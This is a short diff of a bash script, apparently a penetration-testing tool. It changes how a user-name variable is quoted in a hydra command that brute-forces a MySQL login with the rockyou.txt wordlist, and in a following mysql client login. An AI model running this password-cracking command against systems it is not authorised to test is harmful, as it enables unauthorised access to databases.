@@ -279,10 +279,10 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
-                        mysql -u $user -p -A
+                        mysql -u "${user}" -p -A
                     fi
                 fi
             }
